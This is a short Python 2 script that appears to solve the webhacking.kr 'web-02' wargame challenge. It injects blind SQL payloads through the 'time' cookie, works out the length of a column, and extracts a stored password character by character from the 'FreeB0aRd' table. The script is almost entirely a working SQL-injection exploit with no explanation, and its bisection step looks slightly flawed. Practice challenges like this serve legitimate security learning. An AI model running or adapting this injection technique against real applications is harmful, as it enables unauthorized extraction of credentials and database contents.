import requests
import re
import random

base_url = 'http://webhacking.kr/challenge/web/web-02/index.php'
true_time = '2070-01-01 09:00:01'
false_time = '2070-01-01 09:00:00'

# origin_cookie = { 'time' : '1463373821 and ', 'PHPSESSID' : 'k34nfrmji4nt853i2r1fajfen7' }
# cookie = { 'time' : '', 'PHPSESSID' : 'k34nfrmji4nt853i2r1fajfen7' }

r = requests.session()


def injection(payload):
    header = {"Cookie": "time=1463373821 and " + payload + ";PHPSESSID="}
    # header = {"Cookie":"time=1463373821 and 1=0; PHPSESSID=0e74i0iup57k52ps1im2ng8pc6"}
    # cookie['time'] = origin_cookie['time'] + payload
    request = r.get(base_url, headers=header)

    # print request.content
    # print cookie
    if (true_time in request.content):
        return True

    return False

# print injection('1=1')


def getlength(column, table):
    length = 0

    while True:
        length += 1
        payload = 'if((select length(' + column + ') from ' + \
            table + ')=' + str(length) + ',1,0)'
        if injection(payload):
            return length

    print 'getlength Failed!'
    return False


def quickguess(column, table, pos, top, bot):
    pointer = random.randint(top, bot)

    payload = 'if(ascii(substr((select ' + column + ' from ' + \
        table + '),' + str(pos) + ',1))=' + str(pointer) + ',1,0)'
    if (injection(payload)):
        return chr(pointer)

    payload = 'if(ascii(substr((select ' + column + ' from ' + \
        table + '),' + str(pos) + ',1))>' + str(pointer) + ',1,0)'
    if (injection(payload)):
        return quickguess(column, table, pos, pointer + 1, bot)
    else:
        return quickguess(column, table, pos, top, pointer + 1)

    print 'quickguess Failed!'
    return False


def burp(column, table):
    password = ''
    for i in range(getlength(column, table)):
        password = password + \
            quickguess(column, table, i + 1, ord(' '), ord('~'))
        print password

    return password

burp('password', 'FreeB0aRd')
